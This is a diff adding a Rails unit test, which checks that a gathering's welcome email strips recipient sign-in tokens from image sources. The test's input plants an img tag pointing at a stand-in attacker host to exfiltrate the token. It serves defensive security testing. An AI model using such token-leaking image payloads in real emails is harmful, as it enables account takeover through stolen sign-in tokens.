@@ -170,6 +170,24 @@ class GatheringsTest < ActiveSupport::TestCase
     assert_equal member_membership.id, spend.membership_id
   end
 
+  test 'gathering welcome email cannot exfiltrate a sign-in token via an image' do
+    create_gathering
+    @gathering.set(
+      name: '<img src="https://attacker.example/%recipient.token%">',
+      welcome_email: '<p>Hi</p><img src="https://attacker.example/%recipient.token%"><p>%gathering.name%</p><p>%sign_in_details%</p>'
+    )
+    safe_gathering_name = ERB::Util.html_escape(EmailHelper.strip_recipient_secrets(@gathering.name))
+    sign_in_details = %(<a href="#{ENV['BASE_URI']}/g/#{@gathering.slug}?sign_in_token=%recipient.token%">Sign in</a>)
+    html = EmailHelper.html(content: @gathering.welcome_email) do |content|
+      EmailHelper.replace_youtube_oembeds(content)
+                 .gsub('%gathering.name%', safe_gathering_name)
+                 .gsub('%sign_in_details%', sign_in_details)
+    end
+
+    refute_match(%r{src="[^"]*%recipient\.token%}, html)
+    assert_includes html, "#{ENV['BASE_URI']}/g/#{@gathering.slug}?sign_in_token=%recipient.token%"
+  end
+
   test 'comment cannot attach a post from another commentable' do
     create_two_gatherings
     team = @gathering.teams.find_by(name: 'General')
